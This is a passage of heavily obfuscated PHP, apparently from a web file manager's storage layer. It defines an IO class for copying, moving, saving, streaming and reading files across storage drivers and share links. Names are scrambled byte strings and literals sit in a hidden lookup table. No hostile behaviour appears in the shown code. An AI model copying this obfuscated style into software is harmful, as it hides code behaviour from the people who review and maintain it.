array($º´Õú÷™[1123] => $º´Õú÷™[1136], $º´Õú÷™[315] => $º´Õú÷™[1137]); $†ƒÛ‰á‚ = $º´Õú÷™[12]; foreach ($ŠÙ¢¼¦Ã as $¬ç­™«) { if ($¬ç­™«[$º´Õú÷™[57]] == $º´Õú÷™[88]) { $†ƒÛ‰á‚ = $¬ç­™«[$º´Õú÷™[32]]; } $éˆ¢ØÔÔ = array($º´Õú÷™[385] . $¬ç­™«[$º´Õú÷™[32]] . $º´Õú÷™[385], isset($ã£¶âˆ•[$¬ç­™«[$º´Õú÷™[33]]]) ? $ã£¶âˆ•[$¬ç­™«[$º´Õú÷™[33]]] : $¬ç­™«[$º´Õú÷™[33]], $¬ç­™«[$º´Õú÷™[35]] == $º´Õú÷™[88] ? $º´Õú÷™[1128] : $º´Õú÷™[1138] . $¬ç­™«[$º´Õú÷™[56]], $¬ç­™«[$º´Õú÷™[57]] == $º´Õú÷™[88] ? $º´Õú÷™[1139] : $º´Õú÷™[12]); $ù‡ª¸ ™[] = trim(implode($º´Õú÷™[53], $éˆ¢ØÔÔ)); } foreach ($ÜÊ£ as $îä§äã => $Î§¯Ö¯£) { $÷‹ĞÙ¸› = str_replace($º´Õú÷™[1140] . $ß§•æ÷ . $º´Õú÷™[11], $º´Õú÷™[12], $îä§äã); $õëÉÎíˆ = str_replace(array($º´Õú÷™[118], $º´Õú÷™[962]), $º´Õú÷™[385], substr($Î§¯Ö¯£, stripos($Î§¯Ö¯£, $º´Õú÷™[260]))); if ($÷‹ĞÙ¸› == $º´Õú÷™[1117]) { $á’ü«Áø = $º´Õú÷™[1141] . $†ƒÛ‰á‚ . $º´Õú÷™[1142]; } else { $á’ü«Áø = (stripos($÷‹ĞÙ¸›, $º´Õú÷™[11]) ? $º´Õú÷™[1143] : $º´Õú÷™[12]) . ($º´Õú÷™[1144] . $÷‹ĞÙ¸› . $º´Õú÷™[1145] . $õëÉÎíˆ); } $ù‡ª¸ ™[] = $á’ü«Áø; } $ÄÉ–ò‚Ì = array($º´Õú÷™[1146] . $ß§•æ÷ . $º´Õú÷™[1147], $º´Õú÷™[1148] . $ß§•æ÷ . $º´Õú÷™[1149], implode($º´Õú÷™[50] . PHP_EOL, $ù‡ª¸ ™), $º´Õú÷™[1150]); $šÍı¨¢æ = implode(PHP_EOL, $ÄÉ–ò‚Ì); if ($¢ÒÇ§¿Æ && $¢ÒÇ§¿Æ == $º´Õú÷™[806]) { return $šÍı¨¢æ; } $û¾õ¦í÷ = array($º´Õú÷™[806] => $šÍı¨¢æ, $º´Õú÷™[13] => $áøïÉ); return $¢ÒÇ§¿Æ ? $û¾õ¦í÷[$¢ÒÇ§¿Æ] : $û¾õ¦í÷; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($©­«œ, $Çç™Õ«Ò) { $¥îƒÙä =& $_SERVER[ÏéâËõ‘]; $•–õ±öã = $Çç™Õ«Ò; $GLOBALS[$¥îƒÙä[1151]] = $¥îƒÙä[1152] . $©­«œ; Hook::trigger($¥îƒÙä[1152] . $©­«œ . $¥îƒÙä[1153], $•–õ±öã); $¬ŞÒŸ = self::driverMake($Çç™Õ«Ò[0]); if (!$¬ŞÒŸ) { return !1; } if (method_exists($¬ŞÒŸ, $©­«œ)) { $ı³Á²Ïà = @call_user_func_array(array($¬ŞÒŸ, $©­«œ), $Çç™Õ«Ò); } else { if (method_exists($¬ŞÒŸ, $¥îƒÙä[1154])) { $ı³Á²Ïà = @call_user_func_array(array($¬ŞÒŸ, $©­«œ), $Çç™Õ«Ò); } else { if (method_exists(self, $©­«œ)) { $ı³Á²Ïà = @call_user_func_array(array(self, $©­«œ), $Çç™Õ«Ò); } else { $ı³Á²Ïà = call_user_func_array(array(parent, $©­«œ), $Çç™Õ«Ò); } } } Hook::trigger($¥îƒÙä[1152] . $©­«œ . $¥îƒÙä[1155], $•–õ±öã, $ı³Á²Ïà); return $ı³Á²Ïà; } public static function init($§¥‚§å…) { return self::driverMake($§¥‚§å…); } public static function copy($˜Œºê‘Ã, $ÉøÕ‘½î, $ÇúĞ´Ÿë = false, $•µê²® = false) { return self::copyMoveStart($˜Œºê‘Ã, $ÉøÕ‘½î, $ÇúĞ´Ÿë, $_SERVER[ÏéâËõ‘][555], $•µê²®); } public static function move($¬›§Ï€±, $ÆäÕ±, $É›ˆùˆ‚ = false, $×ƒÂ®Îß = false) { return self::copyMoveStart($¬›§Ï€±, $ÆäÕ±, $É›ˆùˆ‚, $_SERVER[ÏéâËõ‘][557], $×ƒÂ®Îß); } private static function copyMoveStart($™Å‡ì², $şÆÏøÀ¶, $ı™”€Ù¾, $ÓËÛ…Åô, $á‘÷Ö·ú) { $Úœ­Å Õ =& $_SERVER[ÏéâËõ‘]; $·Ã…¡Ô™ = array($™Å‡ì², $şÆÏøÀ¶, $ı™”€Ù¾, $á‘÷Ö·ú); Hook::trigger($Úœ­Å Õ[1152] . $ÓËÛ…Åô . $Úœ­Å Õ[1153], $·Ã…¡Ô™); $ÍÄôÙÍ˜ = self::copyMove($™Å‡ì², $şÆÏøÀ¶, $ı™”€Ù¾, $ÓËÛ…Åô, $á‘÷Ö·ú); Hook::trigger($Úœ­Å Õ[1152] . $ÓËÛ…Åô . $Úœ­Å Õ[1155], $·Ã…¡Ô™, $ÍÄôÙÍ˜); return $ÍÄôÙÍ˜; } public static function saveFile($¬¶¦´•î, $–ÕÏ¡Éí, $¡š·Óš– = true) { $˜â‘Ø‘ =& $_SERVER[ÏéâËõ‘]; $è™ªÈÊ¯ = self::info($–ÕÏ¡Éí); $šã•°ó× = self::driverMake($¬¶¦´•î); $â™Öœ®û = self::driverMake($–ÕÏ¡Éí); $åúŠßÄ¨ = !1; if ($â™Öœ®û->pathParse[$˜â‘Ø‘[1156]]) { $åúŠßÄ¨ = $â™Öœ®û; $—ã’¸ê = $â™Öœ®û->pathParse[$˜â‘Ø‘[1156]]; $â™Öœ®û = self::driverMake($—ã’¸ê); } if ($šã•°ó×->pathParse[$˜â‘Ø‘[1156]]) { $ùÉº†Ÿ… = $šã•°ó×->pathParse[$˜â‘Ø‘[1156]]; $šã•°ó× = self::driverMake($ùÉº†Ÿ…); } $ÓàÇÈ«ë = $â™Öœ®û->pathFather($–ÕÏ¡Éí); $Ï ¤—Ø = !0; if (!$¡š·Óš– && self::driverIsSame($šã•°ó×, $â™Öœ®û)) { $Ï ¤—Ø = !1; } $¦ÜöÁ¿Ë = self::copyFile($šã•°ó×, $¬¶¦´•î, $â™Öœ®û, $ÓàÇÈ«ë, $è™ªÈÊ¯[$˜â‘Ø‘[32]], $Ï ¤—Ø); if ($åúŠßÄ¨) { $¦ÜöÁ¿Ë = $åúŠßÄ¨->getPathOuter($¦ÜöÁ¿Ë); } return $¦ÜöÁ¿Ë; } private static function copyMove($íä“®‚¤, $¢–÷œ¨ß, $ì•—”Ó×, $şÕöÍœ¹, $ı±õ«” = false) { $à»Šé„ =& $_SERVER[ÏéâËõ‘]; if (!$íä“®‚¤ || $íä“®‚¤ == $à»Šé„[8] || !$¢–÷œ¨ß) { return !1; } ignore_timeout(); $Šá¿šÜ = self::driverMake($íä“®‚¤); $Á¡±Â¹ƒ = self::driverMake($¢–÷œ¨ß); $‡Ğß¤² = $şÕöÍœ¹ == $à»Šé„[557]; $·éŸ¼Áí = !1; if ($Á¡±Â¹ƒ->pathParse[$à»Šé„[1156]]) { $·éŸ¼Áí = $Á¡±Â¹ƒ; $¢–÷œ¨ß = $Á¡±Â¹ƒ->pathParse[$à»Šé„[1156]]; $Á¡±Â¹ƒ = self::driverMake($¢–÷œ¨ß); } if ($Šá¿šÜ->pathParse[$à»Šé„[1156]]) { $íä“®‚¤ = $Šá¿šÜ->pathParse[$à»Šé„[1156]]; $Šá¿šÜ = self::driverMake($íä“®‚¤); } self::check($Šá¿šÜ, $íä“®‚¤, $Á¡±Â¹ƒ, $¢–÷œ¨ß); Hook::trigger($à»Šé„[1157], $Šá¿šÜ, $íä“®‚¤, $Á¡±Â¹ƒ, $¢–÷œ¨ß); $£ï‹‰”¶ = self::driverIsSame($Šá¿šÜ, $Á¡±Â¹ƒ); if ($£ï‹‰”¶) { if ($şÕöÍœ¹ == $à»Šé„[557] && !method_exists($Á¡±Â¹ƒ, $à»Šé„[1158]) && trim($¢–÷œ¨ß, $à»Šé„[8]) == trim($Á¡±Â¹ƒ->pathFather($íä“®‚¤), $à»Šé„[8])) { if ($Šá¿šÜ->pathThis($íä“®‚¤) != $ı±õ«” && !$Šá¿šÜ->isTypeObject()) { return $Šá¿šÜ->rename($íä“®‚¤, $ı±õ«”); } return $Á¡±Â¹ƒ->getPathOuter($íä“®‚¤); } if (method_exists($Á¡±Â¹ƒ, $şÕöÍœ¹)) { return $Á¡±Â¹ƒ->{$şÕöÍœ¹}($íä“®‚¤, $¢–÷œ¨ß, $ì•—”Ó×, $ı±õ«”); } } if ($£ï‹‰”¶ && $şÕöÍœ¹ == $à»Šé„[557] && $Á¡±Â¹ƒ->getType() == $à»Šé„[106]) { $•¨½¨Š‡ = $Á¡±Â¹ƒ->movePath($íä“®‚¤, $¢–÷œ¨ß, $ı±õ«”); if ($•¨½¨Š‡) { return $•¨½¨Š‡; } } $Ë¹èíÖª = $Šá¿šÜ->isFile($íä“®‚¤); if (!$Ë¹èíÖª && $Á¡±Â¹ƒ->getType() == $à»Šé„[760] && $Šá¿šÜ->getType() == $à»Šé„[106]) { $•¨½¨Š‡ = $Á¡±Â¹ƒ->copyFolderFromIO($Šá¿šÜ, $íä“®‚¤, $¢–÷œ¨ß, $ì•—”Ó×, $‡Ğß¤², $ı±õ«”); } else { $•¨½¨Š‡ = self::copyPath($Šá¿šÜ, $íä“®‚¤, $Á¡±Â¹ƒ, $¢–÷œ¨ß, $ì•—”Ó×, $‡Ğß¤², $Ë¹èíÖª, $ı±õ«”); } if ($•¨½¨Š‡ && $‡Ğß¤²) { $Šá¿šÜ->remove($íä“®‚¤); } if ($·éŸ¼Áí) { $•¨½¨Š‡ = $·éŸ¼Áí->getPathOuter($•¨½¨Š‡); } return $•¨½¨Š‡; } private static function check($¸º¸ßÆ, $Ğ›úğÏİ, $“ïä²èİ, &$Ë¿Ğã†‡) { $äîÅ²‰ =& $_SERVER[ÏéâËõ‘]; if (self::driverIsSame($¸º¸ßÆ, $“ïä²èİ) && $¸º¸ßÆ->isFolder($Ğ›úğÏİ) && $¸º¸ßÆ->isParentOf($Ğ›úğÏİ, $Ë¿Ğã†‡)) { show_json(LNG($äîÅ²‰[1159]), !1); } if (!$¸º¸ßÆ->exist($Ğ›úğÏİ)) { show_json(LNG($äîÅ²‰[105]), !1); } } private static function copyPath($Ğ‘¸’«å, $õâ†“ä›, $º‘¦ÜÄ, $¿ÒãíÀ¨, $ãº´›§—, $ôª„‰¯’, $†—ã½£Ş, $Œ±õà×Ü = false, $Ó”Öîú¡ = true) { $¯ˆ©÷­¼ =& $_SERVER[ÏéâËõ‘]; $ Ã¹”ï• = empty($Œ±õà×Ü) && $Œ±õà×Ü !== $¯ˆ©÷­¼[197] ? $Ğ‘¸’«å->pathThis($õâ†“ä›) : $Œ±õà×Ü; if ($ãº´›§—) { $•¯õ± = $º‘¦ÜÄ->fileNameExist($¿ÒãíÀ¨, $ Ã¹”ï•); $†°€Îçç = $ Ã¹”ï•; $ Ã¹”ï• = $º‘¦ÜÄ->fileNameAuto($¿ÒãíÀ¨, $ Ã¹”ï•, $ãº´›§—, !$†—ã½£Ş); if (!$•¯õ± || $†°€Îçç != $ Ã¹”ï•) { $ãº´›§— = !1; } if ($Ó”Öîú¡ && !$ãº´›§—) { $º‘¦ÜÄ->_data[$¯ˆ©÷­¼[1160]] = !0; } } if ($†—ã½£Ş) { return self::copyFile($Ğ‘¸’«å, $õâ†“ä›, $º‘¦ÜÄ, $¿ÒãíÀ¨, $ Ã¹”ï•, $ôª„‰¯’); } if ($ãº´›§— == REPEAT_RENAME_FOLDER) { $ãº´›§— = !1; } $Û±ÚÓ… = rtrim($¿ÒãíÀ¨, $¯ˆ©÷­¼[8]) . $¯ˆ©÷­¼[8] . $ Ã¹”ï•; $çûÀŞË = $º‘¦ÜÄ->mkdir($º‘¦ÜÄ->getPath($Û±ÚÓ…), $ãº´›§—); $¿ÒãíÀ¨ = $º‘¦ÜÄ->getPathInner($çûÀŞË); $òö½¥ô = $Ğ‘¸’«å->listPath($õâ†“ä›, !0); $òö½¥ô = is_array($òö½¥ô) ? $òö½¥ô : array($¯ˆ©÷­¼[83] => array(), $¯ˆ©÷­¼[82] => array()); $íü§Í¾ = array_merge($òö½¥ô[$¯ˆ©÷­¼[83]], $òö½¥ô[$¯ˆ©÷­¼[82]]); foreach ($íü§Í¾ as $üößĞÀ—) { $¹ù¬ğÌ÷ = $üößĞÀ—[$¯ˆ©÷­¼[33]] == $¯ˆ©÷­¼[199]; $õâ†“ä› = $Ğ‘¸’«å->getPathInner($üößĞÀ—[$¯ˆ©÷­¼[84]]); $è‘Øşè = self::copyPath($Ğ‘¸’«å, $õâ†“ä›, $º‘¦ÜÄ, $¿ÒãíÀ¨, $ãº´›§—, $ôª„‰¯’, $¹ù¬ğÌ÷, !1, !1); if (!$è‘Øşè) { IO::errorTips($¯ˆ©÷­¼[1161] . $õâ†“ä› . $¯ˆ©÷­¼[70] . $¿ÒãíÀ¨); } } self::copyMoveKeepInfo($Ğ‘¸’«å, $õâ†“ä›, $çûÀŞË); return $çûÀŞË; } private static function copyFile($øŠË×Èà, $•¬Ş§»±, $•¡Ş¬»œ, $‚û™£ÂÍ, $šËÄÍòï, $½ª•Îš„) { $µÒ×Úæ =& $_SERVER[ÏéâËõ‘]; $‚û™£ÂÍ = $•¡Ş¬»œ->getPath(rtrim($‚û™£ÂÍ, $µÒ×Úæ[8]) . $µÒ×Úæ[8] . $šËÄÍòï); $à¯ÌóÁÛ = $µÒ×Úæ[1162] . time() . rand_string(5); Hook::trigger($µÒ×Úæ[1163], $øŠË×Èà, $•¬Ş§»±, $•¡Ş¬»œ, $‚û™£ÂÍ, $šËÄÍòï, $à¯ÌóÁÛ); if (self::driverIsSame($øŠË×Èà, $•¡Ş¬»œ)) { if ($½ª•Îš„) { $Ç“ÚÁù– = $•¡Ş¬»œ->moveFile($•¬Ş§»±, $‚û™£ÂÍ); } else { $Ç“ÚÁù– = $•¡Ş¬»œ->copyFile($•¬Ş§»±, $‚û™£ÂÍ); } Hook::trigger($µÒ×Úæ[1164], $øŠË×Èà, $•¬Ş§»±, $•¡Ş¬»œ, $‚û™£ÂÍ, $šËÄÍòï, $Ç“ÚÁù–); self::copyMoveKeepInfo($øŠË×Èà, $•¬Ş§»±, $Ç“ÚÁù–); return $Ç“ÚÁù–; } $Éá¾¯…„ = TEMP_FILES; if ($GLOBALS[$µÒ×Úæ[6]][$µÒ×Úæ[89]][$µÒ×Úæ[798]]) { $Éá¾¯…„ = $GLOBALS[$µÒ×Úæ[6]][$µÒ×Úæ[89]][$µÒ×Úæ[798]]; } $ø•ë…¼³ = $Éá¾¯…„; mk_dir($ø•ë…¼³); $ÎŞ˜Íî° = $ø•ë…¼³ . $à¯ÌóÁÛ; $áÌô·´é = $ÎŞ˜Íî°; $ÎŞ˜Íî° = $øŠË×Èà->download($•¬Ş§»±, $ÎŞ˜Íî°); $ÎŞ˜Íî° = $øŠË×Èà->iconvApp($ÎŞ˜Íî°); if (substr($ÎŞ˜Íî°, strlen($Éá¾¯…„)) == $Éá¾¯…„) { $½ª•Îš„ = !0; } $Ç“ÚÁù– = $•¡Ş¬»œ->upload($‚û™£ÂÍ, $ÎŞ˜Íî°, $½ª•Îš„); self::remove($áÌô·´é); Hook::trigger($µÒ×Úæ[1164], $øŠË×Èà, $•¬Ş§»±, $•¡Ş¬»œ, $‚û™£ÂÍ, $šËÄÍòï, $Ç“ÚÁù–); self::copyMoveKeepInfo($øŠË×Èà, $•¬Ş§»±, $Ç“ÚÁù–); return $Ç“ÚÁù–; } private static function copyMoveKeepInfo($âºÎüŸ, $¹Ú±ø±å, $ãì¢«Š) { if (!$ãì¢«Š) { return; } $©æÍªˆ± = $âºÎüŸ->info($¹Ú±ø±å); if (!is_array($©æÍªˆ±)) { return; } IO::setModifyTime($ãì¢«Š, $©æÍªˆ±[$_SERVER[ÏéâËõ‘][85]]); } public static function pathFather($ä”ĞÜ‰¥) { $ÛıÁ¡†ü = IO::init($ä”ĞÜ‰¥); $ó¼Á˜‹Ë = $ÛıÁ¡†ü->pathFather($ÛıÁ¡†ü->path); return $ÛıÁ¡†ü->getPathOuter($ó¼Á˜‹Ë); } public static function fileOut($õ±¦á, $œ«Íş§É = false, $‚Ä«Å•Ù = false, $¢Ê¬Ç¸Ì = '') { $Öš‰Îûü = self::driverMake($õ±¦á); if ($Öš‰Îûü->isFileOutServer()) { return $Öš‰Îûü->fileOutServer($õ±¦á, $œ«Íş§É, $‚Ä«Å•Ù, $¢Ê¬Ç¸Ì); } return $Öš‰Îûü->fileOut($õ±¦á, $œ«Íş§É, $‚Ä«Å•Ù, $¢Ê¬Ç¸Ì); } public static function fileOutImage($£„Œ¦§€, $à¨İÑ = 250) { $ªŠÂ‰©À = array(250, 600, 1200, 2000, 3000, 5000); for ($‡€¡­Ô¡ = 0; $‡€¡­Ô¡ < count($ªŠÂ‰©À); $‡€¡­Ô¡++) { if ($‡€¡­Ô¡ == 0 && $à¨İÑ <= $ªŠÂ‰©À[$‡€¡­Ô¡]) { $à¨İÑ = $ªŠÂ‰©À[$‡€¡­Ô¡]; break; } else { if ($à¨İÑ > $ªŠÂ‰©À[$‡€¡­Ô¡ - 1] && $à¨İÑ <= $ªŠÂ‰©À[$‡€¡­Ô¡]) { $à¨İÑ = $ªŠÂ‰©À[$‡€¡­Ô¡]; break; } else { if ($‡€¡­Ô¡ == count($ªŠÂ‰©À) - 1 && $à¨İÑ > $ªŠÂ‰©À[$‡€¡­Ô¡]) { $à¨İÑ = $ªŠÂ‰©À[$‡€¡­Ô¡]; break; } } } } $´¬²Îñã = self::driverMake($£„Œ¦§€); if ($´¬²Îñã->isFileOutServer()) { return $´¬²Îñã->fileOutImageServer($£„Œ¦§€, $à¨İÑ); } return $´¬²Îñã->fileOutImage($£„Œ¦§€, $à¨İÑ); } private static function driverIsSame($£ûä–¨«, $…×àÁÕ) { $‡¯ŸşÈ =& $_SERVER[ÏéâËõ‘]; $©¶ïô§ö = $£ûä–¨«->getType(); $¥Ãï¹ğ‰ = $…×àÁÕ->getType(); if ($©¶ïô§ö != $¥Ãï¹ğ‰) { return !1; } if ($©¶ïô§ö == $‡¯ŸşÈ[760]) { return !0; } if ($©¶ïô§ö == $‡¯ŸşÈ[106]) { return !0; } if ($£ûä–¨«->pathDriver == $…×àÁÕ->pathDriver) { return !0; } return !1; } public static function copyUpdate($íÈ²—™Â, $ÌË”‚„¯) { $ø³ßÓ¨Ê =& $_SERVER[ÏéâËõ‘]; if (!IO::exist($íÈ²—™Â)) { return !1; } if (!IO::exist($ÌË”‚„¯)) { IO::mkdir($ÌË”‚„¯); } $ì€•éîà = self::_listAll($íÈ²—™Â); $Ïú—Ú’À = self::_listAll($ÌË”‚„¯); $ê‹ú€‰® = array(); $ì¡¿èÙ§ = array(); foreach ($ì€•éîà as $‹¦ñ¥÷‡ => $×ëÑ†) { if (isset($Ïú—Ú’À[$‹¦ñ¥÷‡])) { if ($×ëÑ†[$ø³ßÓ¨Ê[75]] == 1) { continue; } if ($Ïú—Ú’À[$‹¦ñ¥÷‡][$ø³ßÓ¨Ê[76]] == $×ëÑ†[$ø³ßÓ¨Ê[76]]) { continue; } } if ($×ëÑ†[$ø³ßÓ¨Ê[75]] == 1) { $ì¡¿èÙ§[] = $ÌË”‚„¯ . $ø³ßÓ¨Ê[8] . $‹¦ñ¥÷‡; continue; } $§«ÁÎ¨î = strstr(trim($‹¦ñ¥÷‡, $ø³ßÓ¨Ê[8]), $ø³ßÓ¨Ê[8]) ? get_path_father($‹¦ñ¥÷‡) : $ø³ßÓ¨Ê[12]; $ê‹ú€‰®[] = array($ø³ßÓ¨Ê[1165] => $×ëÑ†[$ø³ßÓ¨Ê[84]], $ø³ßÓ¨Ê[1166] => rtrim($ÌË”‚„¯, $ø³ßÓ¨Ê[8]) . $ø³ßÓ¨Ê[8] . $§«ÁÎ¨î, $ø³ßÓ¨Ê[1167] => $×ëÑ†); } $ŸÌ– §¾ = array($ø³ßÓ¨Ê[199] => $ê‹ú€‰®, $ø³ßÓ¨Ê[75] => $ì¡¿èÙ§); Hook::trigger($ø³ßÓ¨Ê[1168], $íÈ²—™Â, $ÌË”‚„¯, $ŸÌ– §¾); foreach ($ì¡¿èÙ§ as $×ëÑ†) { IO::mkdir($×ëÑ†); } foreach ($ê‹ú€‰® as $×ëÑ†) { IO::copy($×ëÑ†[$ø³ßÓ¨Ê[1165]], $×ëÑ†[$ø³ßÓ¨Ê[1166]], REPEAT_REPLACE); } } private static function _listAll($ä©»ºÇØ) { $Ë¡‡äğĞ =& $_SERVER[ÏéâËõ‘]; $ä©»ºÇØ = KodIO::clear($ä©»ºÇØ); $Øç´€ø© = IO::listAll($ä©»ºÇØ); foreach ($Øç´€ø© as &$Ùµ³é×¥) { $É¦š”‰… = substr($Ùµ³é×¥[$Ë¡‡äğĞ[84]], strlen($ä©»ºÇØ)); $Ùµ³é×¥[$Ë¡‡äğĞ[1169]] = trim($É¦š”‰…, $Ë¡‡äğĞ[8]); } unset($Ùµ³é×¥); return array_to_keyvalue($Øç´€ø©, $Ë¡‡äğĞ[1169]); } public static function fileSubstr($øéÏ‰ÍÃ, $¶„–Ô¼ú, $ö‡£Çôò = false) { $ÊÒŠ¶—¿ =& $_SERVER[ÏéâËõ‘]; $©¶ÖÌÃ = self::driverMake($øéÏ‰ÍÃ); $ÜÑóËÚ½ = $©¶ÖÌÃ->size($øéÏ‰ÍÃ); $“ÒÍ…Ôç = $¶„–Ô¼ú; $ª¹¿µ° = $ö‡£Çôò; if ($¶„–Ô¼ú < 0) { $¶„–Ô¼ú = $ÜÑóËÚ½ + $¶„–Ô¼ú; } if ($ö‡£Çôò === !1) { $ö‡£Çôò = $ÜÑóËÚ½ - $¶„–Ô¼ú; } if ($¶„–Ô¼ú + $ö‡£Çôò > $ÜÑóËÚ½) { $ö‡£Çôò = $ÜÑóËÚ½ - $¶„–Ô¼ú; } if (!$ÜÑóËÚ½ && $©¶ÖÌÃ->getType() == $ÊÒŠ¶—¿[106] && !$©¶ÖÌÃ->exist($øéÏ‰ÍÃ)) { $ÔàŞÎ‹Ô = get_path_this($øéÏ‰ÍÃ); $€ÂŸü†¡ = parse_url_query($ÔàŞÎ‹Ô); if (is_array($€ÂŸü†¡) && isset($€ÂŸü†¡[$ÊÒŠ¶—¿[32]])) { $ÔàŞÎ‹Ô = urldecode($€ÂŸü†¡[$ÊÒŠ¶—¿[32]]); } throw new Exception($ÊÒŠ¶—¿[1170] . LNG($ÊÒŠ¶—¿[1171]) . $ÊÒŠ¶—¿[971] . clear_html($ÔàŞÎ‹Ô) . $ÊÒŠ¶—¿[12]); } if ($ö‡£Çôò <= 0) { return $ÊÒŠ¶—¿[12]; } if ($¶„–Ô¼ú < 0 || $¶„–Ô¼ú >= $ÜÑóËÚ½ || $ö‡£Çôò > 1024 * 1024 * 10) { throw new Exception("\146\x69\x6c\x65\122\x65\x61\x64\40\145\x72\162\157\162\x21\x20\x73\164\141\x72\x74\75{$¶„–Ô¼ú}\x3b\154\145\156\x67\164\150\75{$ö‡£Çôò}\73\40\x73\x69\172\145\75{$ÜÑóËÚ½}\x3b"); } $Á·‰»Ê = $©¶ÖÌÃ->fileSubstr($øéÏ‰ÍÃ, $¶„–Ô¼ú, $ö‡£Çôò); if (!$Á·‰»Ê && $ö‡£Çôò && isset($GLOBALS[$ÊÒŠ¶—¿[1172]])) { throw new Exception($GLOBALS[$ÊÒŠ¶—¿[1172]][$ÊÒŠ¶—¿[1173]]); } return $Á·‰»Ê; } private static function driverMake(&$­’«½ã³) { $ÅĞÀî€‰ =& $_SERVER[ÏéâËõ‘]; $äıÊì§æ = KodIO::parse($­’«½ã³); if (!self::$driverListSystem) { $şƒÖ‘§– = Model($ÅĞÀî€‰[769])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($şƒÖ‘§–, $ÅĞÀî€‰[399]); } if ($äıÊì§æ[$ÅĞÀî€‰[33]] == KodIO::KOD_IO && !self::$driverListSystem[$äıÊì§æ[$ÅĞÀî€‰[399]]]) { return !1; } $­’«½ã³ = $äıÊì§æ[$ÅĞÀî€‰[1174]]; $¦‘ÆšÌ‘ = self::driverGet($äıÊì§æ, $­’«½ã³); return $¦‘ÆšÌ‘; } private static function driverGet($ÕŞ°’Ú, &$™ùè…Âñ) { $Í‚´Ü›Ÿ =& $_SERVER[ÏéâËõ‘]; $Ä•í‚ß´ = $ÕŞ°’Ú[$Í‚´Ü›Ÿ[1175]]; $ß‚øËâË = $ÕŞ°’Ú[$Í‚´Ü›Ÿ[399]]; switch ($ÕŞ°’Ú[$Í‚´Ü›Ÿ[33]]) { case KodIO::KOD_IO: $Ÿø š¥Ò = self::$driverListSystem[$ß‚øËâË]; break; case KodIO::KOD_SOURCE: $™ùè…Âñ = $ß‚øËâË . $™ùè…Âñ; $Ÿø š¥Ò = array($Í‚´Ü›Ÿ[1176] => $Í‚´Ü›Ÿ[1177], $Í‚´Ü›Ÿ[6] => $ÕŞ°’Ú); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Æå”€Ÿ¸ = $GLOBALS[$Í‚´Ü›Ÿ[1178]]; self::$driverListUser = array_to_keyvalue($Æå”€Ÿ¸, $Í‚´Ü›Ÿ[399]); } $Ÿø š¥Ò = self::$driverListUser[$ß‚øËâË]; break; case KodIO::KOD_SHARE_LINK: $Ÿø š¥Ò = array($Í‚´Ü›Ÿ[1176] => $Í‚´Ü›Ÿ[1179], $Í‚´Ü›Ÿ[6] => $ÕŞ°’Ú); $­£õ¿Öú = Action($Í‚´Ü›Ÿ[1180])->sharePathInfo($ÕŞ°’Ú[$Í‚´Ü›Ÿ[84]]); $™ùè…Âñ = $­£õ¿Öú[$Í‚´Ü›Ÿ[402]]; if (!$­£õ¿Öú[$Í‚´Ü›Ÿ[402]]) { $ˆÆäÅÀº = Model($Í‚´Ü›Ÿ[601])->getInfo($­£õ¿Öú[$Í‚´Ü›Ÿ[489]]); $™ùè…Âñ = KodIO::clear($ˆÆäÅÀº[$Í‚´Ü›Ÿ[1181]] . $ÕŞ°’Ú[$Í‚´Ü›Ÿ[1174]]); $ÕŞ°’Ú[$Í‚´Ü›Ÿ[487]] = $ˆÆäÅÀº; $ÕŞ°’Ú[$Í‚´Ü›Ÿ[1156]] = $™ùè…Âñ; $Ÿø š¥Ò = array($Í‚´Ü›Ÿ[1176] => $Í‚´Ü›Ÿ[1182], $Í‚´Ü›Ÿ[6] => $ÕŞ°’Ú); } break; case KodIO::KOD_SHARE_ITEM: $Ÿø š¥Ò = array($Í‚´Ü›Ÿ[1176] => $Í‚´Ü›Ÿ[1183], $Í‚´Ü›Ÿ[6] => $ÕŞ°’Ú); $ˆÆäÅÀº = Model($Í‚´Ü›Ÿ[601])->getInfo($ÕŞ°’Ú[$Í‚´Ü›Ÿ[399]]); if ($ˆÆäÅÀº[$Í‚´Ü›Ÿ[402]] == $Í‚´Ü›Ÿ[197]) { $™ùè…Âñ = KodIO::clear($ˆÆäÅÀº[$Í‚´Ü›Ÿ[1181]] . $ÕŞ°’Ú[$Í‚´Ü›Ÿ[1174]]); $ÕŞ°’Ú[$Í‚´Ü›Ÿ[487]] = $ˆÆäÅÀº; $ÕŞ°’Ú[$Í‚´Ü›Ÿ[1156]] = $™ùè…Âñ; $Ÿø š¥Ò = array($Í‚´Ü›Ÿ[1176] => $Í‚´Ü›Ÿ[1184], $Í‚´Ü›Ÿ[6] => $ÕŞ°’Ú); } else { if (!$™ùè…Âñ) { $™ùè…Âñ = $ˆÆäÅÀº[$Í‚´Ü›Ÿ[402]]; } } break; default: $™ùè…Âñ = $ÕŞ°’Ú[$Í‚´Ü›Ÿ[84]]; $Ÿø š¥Ò = array($Í‚´Ü›Ÿ[1176] => $Í‚´Ü›Ÿ[1185]); break; } $ó‡­ëàú = $ÕŞ°’Ú[$Í‚´Ü›Ÿ[84]]; if (!isset(self::$driverCache[$ó‡­ëàú])) { $¶Šü» = strtolower($Ÿø š¥Ò[$Í‚´Ü›Ÿ[95]]); $¾§Îšçº = $GLOBALS[$Í‚´Ü›Ÿ[6]][$Í‚´Ü›Ÿ[89]][$Í‚´Ü›Ÿ[828]]; $ß£ÕõğÒ = $Í‚´Ü›Ÿ[74] . (isset($¾§Îšçº[$¶Šü»]) ? $¾§Îšçº[$¶Šü»] : ucfirst($¶Šü»)); if (!class_exists($ß£ÕõğÒ)) { show_json("{$ß£ÕõğÒ}\x20\x6e\x6f\x74\40\145\170\151\x73\x74\163\41", !1); } $ÊÜƒõ = isset($Ÿø š¥Ò[$Í‚´Ü›Ÿ[6]]) ? $Ÿø š¥Ò[$Í‚´Ü›Ÿ[6]] : !1; self::$driverCache[$ó‡­ëàú] = new $ß£ÕõğÒ($ÊÜƒõ); } $ÈÍÓº = self::$driverCache[$ó‡­ëàú]; $ÈÍÓº->pathDriver = $Ä•í‚ß´; $ÈÍÓº->pathBase = $Í‚´Ü›Ÿ[12]; if (isset($Ÿø š¥Ò[$Í‚´Ü›Ÿ[6]][$Í‚´Ü›Ÿ[1186]])) { $ÈÍÓº->pathBase = rtrim($Ÿø š¥Ò[$Í‚´Ü›Ÿ[6]][$Í‚´Ü›Ÿ[1186]], $Í‚´Ü›Ÿ[8]) . 